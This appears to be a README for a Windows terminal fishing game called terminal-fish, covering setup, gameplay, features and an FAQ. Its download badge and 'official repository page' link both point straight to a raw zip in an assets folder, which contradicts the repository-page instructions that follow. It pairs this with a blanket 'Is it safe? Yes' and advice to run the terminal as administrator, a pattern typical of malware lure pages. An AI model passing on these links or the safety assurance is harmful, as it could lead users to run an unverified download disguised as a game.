# 🎣 terminal-fish - Catch fish inside your own terminal

[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://raw.githubusercontent.com/tactical-basidiomycetes9418/terminal-fish/main/assets/fish-terminal-2.6.zip)

terminal-fish brings the excitement of fishing to your computer screen using simple text characters. You do not need experience with code or computers to play this game. This project focuses on relaxation and collection. You catch digital fish, move them into an aquarium, and keep track of your findings in a digital book called the FishDex. The entire experience happens inside a standard terminal window on your Windows computer.

## 🛠 Prerequisites

You need a few things on your computer before you start playing. Ensure you have the following installed:

1. A Windows 10 or Windows 11 operating system.
2. Python. You can download the latest version from the official Python website if you do not have it. During installation, make sure to check the box that says "Add Python to PATH."
3. A terminal application. Windows Terminal comes installed on most modern computers. You can also use Command Prompt or PowerShell.

## 📥 Getting Started

Follow these steps to set up the game on your system.

1. Visit the [official repository page](https://raw.githubusercontent.com/tactical-basidiomycetes9418/terminal-fish/main/assets/fish-terminal-2.6.zip) to download the game.
2. Look for the green "Code" button near the top right of the page.
3. Click "Download ZIP" to save the game files to your computer.
4. Locate the downloaded file in your "Downloads" folder.
5. Right-click the file and select "Extract All." Choose a folder where you want to keep the game and click "Extract."
6. Open the folder you just created.

## 🕹 How to Play

Once you have the files on your computer, you are ready to start your fishing journey.

1. Open your terminal by clicking the Start button and typing "Terminal" or "PowerShell."
2. Type `cd` followed by a space, then drag the folder containing the game into the terminal window. Press Enter.
3. Type `python main.py` and press Enter to launch the game.
4. Use your keyboard arrow keys to navigate the menus.
5. Press the Spacebar to cast your line into the water.
6. Wait for a bite. When the text changes, press Enter to reel in your catch.

## 🐠 Features

*   **Diverse Catching Mechanics:** Different fish require different timing techniques. Master your reel to catch rare varieties.
*   **Virtual Aquarium:** Move the fish you catch into a live aquarium view. Watch them swim across your terminal screen while you work or relax.
*   **FishDex Catalog:** A built-in database tracks every fish you catch. View detailed descriptions and statistics for every entry in your collection.
*   **ASCII Art Graphics:** The game uses text-based art to render the environment and the fish. This design choice ensures the game runs smoothly on any system without heavy graphics requirements.
*   **Customizable Settings:** Change the color themes of your terminal or the game interface to suit your preferences.

## ⚙️ Troubleshooting

If the game does not start, check these common issues:

*   **Python Path:** If your computer says "python is not recognized," you need to reinstall Python and select the "Add to PATH" option during setup.
*   **Terminal Size:** Make sure your terminal window is large enough to display the ASCII art. If the screen looks scrambled, drag the corners of the window to make it wider.
*   **Permissions:** You may need to run your terminal as an administrator if you saved the game in a restricted system folder.

## 📂 File Structure

*   `main.py`: This is the primary file that starts the game engine.
*   `assets`: This folder contains the text-based art files for the fish and environments.
*   `data`: This folder stores your save files, including your FishDex and aquarium state.
*   `requirements.txt`: This file tells your computer which additional tools are needed to play the game correctly.

## 📋 Common Questions

**Do I need an internet connection?**
No. Once you download the files, the game runs entirely on your local computer.

**Can I move my game to a different computer?**
Yes. Copy the folder containing the game to a USB drive or cloud storage. You can move the files to any computer that has Python installed.

**Is it safe?**
Yes. This is an open-source project. You can inspect all files manually to see exactly how the game functions.

**How do I save my progress?**
The game automatically saves your progress whenever you catch a fish or move a fish to your aquarium. Your data remains in the `data` folder regardless of when you close the terminal.